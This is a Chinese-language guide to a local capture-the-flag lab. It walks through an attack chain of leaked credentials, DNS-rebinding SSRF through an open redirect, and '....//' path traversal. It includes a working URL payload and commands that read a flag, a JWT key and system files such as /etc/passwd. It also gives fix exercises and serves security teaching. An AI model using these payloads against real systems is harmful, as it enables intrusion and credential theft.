# SupplyLink 实验环境指南

> 目标：亲手打出完整攻击链 —— **信息泄露 → SSRF（DNS Rebinding + 开放重定向）→ 内网服务 → 路径穿越 → 拿 flag**
>
> 支持 **原生 Linux（含 WSL）和 macOS**。脚本不依赖固定目录，clone 到哪儿都能跑。

---

## 一、环境里有什么

```
仓库根目录/
├── source/                        # 题目源码（www.zip 原样）
│   ├── public/  internal/  src/  scripts/  dns/
├── lab/
│   ├── start_lab.sh / stop_lab.sh # 启动 / 关闭（sudo 运行）
│   ├── attack.py                  # 一键自动攻击
│   ├── trace_payload.php + run_trace.sh   # payload 单步追踪器
│   ├── rebind_demo.py             # DNS rebinding 机理小实验
│   └── fetch_test.* / read_test.sh        # 细节验证脚本
└── runtime/                       # 运行后生成：数据库、日志（不进 git）
```

启动后在本机开启：

| 组件 | 地址 | 角色 |
|---|---|---|
| 门户 A | http://127.0.0.1:8000 | 你浏览器访问的网站 |
| 门户 B | 0.0.0.0:8080 | 模拟"靶机公网入口"，rebinding 域名解析回 127.0.0.1 后命中它 |
| 内网预览 | 127.0.0.1:8081 | 攻击目标（internal/） |
| rebinding DNS | 127.0.0.1:53 | 首查回公网 IP、10 秒内再查回 127.0.0.1 |

> 真实靶机里门户 A、B 是同一个站点；本地拆两个进程只是因为 PHP 内置
> 服务器单线程，自己请求自己会死锁。对攻击链没有影响。

## 二、启动 / 关闭

```bash
git clone <仓库地址> && cd supplylink     # 或解压后进入目录

sudo bash lab/start_lab.sh                 # 启动（会临时切换系统 DNS）
sudo bash lab/stop_lab.sh                  # 关闭并恢复系统 DNS
```

⚠️ 运行期间本机所有域名解析都会经过 rebinding 服务器（只认
`*.cache.rebind.huanyutech.cn`，其余 NXDOMAIN）——表现为"断网"，属预期。
**务必用 stop_lab.sh 关闭**，它会恢复原 DNS。

平台差异（脚本已自动处理）：

- **Linux**：直接改写 `/etc/resolv.conf`（备份到 `.bak`）；
- **macOS**：系统 DNS 由 `networksetup` 管理，脚本会逐个网络服务切换并
  `dscacheutil -flushcache` + 重启 mDNSResponder；原配置备份在
  `runtime/macos_dns_backup.txt`，停止时自动还原。

## 三、三种玩法（由浅入深）

### 玩法 1：一键看全程

```bash
python3 lab/attack.py                                              # 任务1：读 /var/flag.txt
python3 lab/attack.py "....//....//....//opt/supplylink/config/jwt.key"   # 任务2：偷 JWT 密钥
```

脚本逐步打印：登录 → 两个"对照组"看防线拦截 → 构造恶意 URL →
rebinding 时序 → 下载归档 → 打印 flag。

### 玩法 2：单步追踪（看每个变量长什么样）

```bash
bash lab/run_trace.sh
```

用项目真实源码逐关执行 payload，打印每一关后变量的值。

### 玩法 3：纯手动，像真实比赛一样操作

**① 登录** `http://127.0.0.1:8000/login.php`
（账号在源码 `login.php` 第 57 行注释里：`supplier_demo / Huanyu2026!`）。

**② 撞防线**（工作台提交，观察报错）：

| 提交 | 报错 | 说明 |
|---|---|---|
| `http://127.0.0.1/a.txt` | 禁止导入内网地址 | IP 黑名单生效 |
| `http://127.0.0.1:8081/a.txt` | Only standard web ports | 端口白名单生效 |

**③ 感受 rebinding**：

```bash
bash lab/rebind_demo.py        # 或另开终端连查两次 getent hosts test.cache.rebind.huanyutech.cn
```

**④ 构造并提交恶意 URL**（每次换一个**没查过的子域名**）：

```
http://abc123.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2Fflag.txt
```

（任务 2 把路径换成 `....//....//....//opt/supplylink/config/jwt.key`，编码后
`....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key`）

**⑤ 回工作台 → 归档记录 → 下载**，文件内容就是预览服务的输出。

## 四、漏洞清单与源码定位

| # | 漏洞 | 位置（source/ 下） | 要点 |
|---|---|---|---|
| 1 | 信息泄露 | `public/login.php:57`、`scripts/init_db.php:42` | 注释/硬编码里的联调账号 |
| 2 | IP 黑名单 TOCTOU | `src/import_service.php:148-164` | "DNS is resolved during validation time only" |
| 3 | rebinding 基础设施 | `dns/rebind_dns.py:98-106` | 10 秒窗口：首查公网、再查 127.0.0.1 |
| 4 | 开放重定向 | `public/jump.php:20-28` | 只查 scheme，任意跳转 |
| 5 | 重定向不复查 | `src/import_service.php:169-178` | `follow_location=1`，302 后不再校验 |
| 6 | 内网 IP 白名单失效 | `internal/debug/preview.php:4-10` | SSRF 发自本机，REMOTE_ADDR 必为 127.0.0.1 |
| 7 | 路径穿越 | `internal/debug/preview.php:21` | `str_replace('../','')` 只替换一遍 → `....//` |

## 五、排错口诀

- `Only standard web ports` → 把内层地址原样交了，要粘完整包装版；
- `Connection refused` → 外层端口错了（本地门户 B 是 8080）；
- `禁止导入内网地址: 127.0.0.1` → 子域名 10 秒内被查过，换新的立刻重交；
- 导入成功但内容是 `preview target not found` → `....//` 层数或文件名不对
  （`/var/cache/archive/` 退到 `/` 要三层）。

## 六、自己动手改一改（巩固）

1. **修复 preview.php 的穿越**：把 `str_replace` 换成 `realpath()` 白名单
   校验，再跑 attack.py，应该失败。
2. **修复重定向复查**：给 `fetch_remote_document()` 关掉
   `follow_location`，攻击断在哪一步？
3. **修复 TOCTOU**：校验后把 host 换成已验证的 IP 再抓取（带上 Host 头），
   rebinding 还能成功吗？
4. 把目标换成 `....//....//....//etc/passwd` 或 `/proc/self/environ`，
   看看 LFI 还能读到什么。
